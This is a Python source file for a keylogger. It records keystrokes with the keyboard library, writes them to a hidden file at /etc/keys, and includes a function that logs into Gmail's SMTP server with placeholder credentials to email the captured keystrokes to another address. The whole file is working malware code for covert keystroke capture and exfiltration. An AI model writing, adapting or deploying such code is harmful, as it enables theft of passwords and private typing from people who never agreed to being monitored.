import keyboard , os , smtplib

def SaveData(Data):
    os.system('touch /etc/keys')
    with open('/etc/keys' , 'a') as HiddenFile:
        HiddenFile.write(Data)

def StartSMTPServiceForGmail():
	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
	SMTPServer.ehlo()
	SMTPServer.starttls()
	return SMTPServer

def SendData():
    Email = "YOUR_EMAIL";Password = "YOUR_PASSWORD";Reciver = "ANOTHER_EMAIL";Data = ReadData()
    SMTPServer = StartSMTPServiceForGmail()
    SMTPServer.login(Email , Password)
    SMTPServer.sendmail(Email , Reciver , Data)

def ReadData():
    with open('/etc/keys' , 'r') as DataFile:
        Data = DataFile.read()
    return Data


def FilterToGetTheKey(Line):
    Line = str(Line)
    Line = Line.replace('KeyboardEvent' , '');Line = Line.replace('up' , '');Line = Line.replace('down' , '');Line = Line.replace(' , ' , '');Line = Line.replace('('  , '');Line = Line.replace(' )' , '')
    Line = Line + "\n"
    print(Line)
    SaveData(Line)

def TakeRecord():
    Record = keyboard.record(until='Esc')
    for Line in Record:
        FilterToGetTheKey(Line=Line)

if __name__ == "__main__":
    TakeRecord()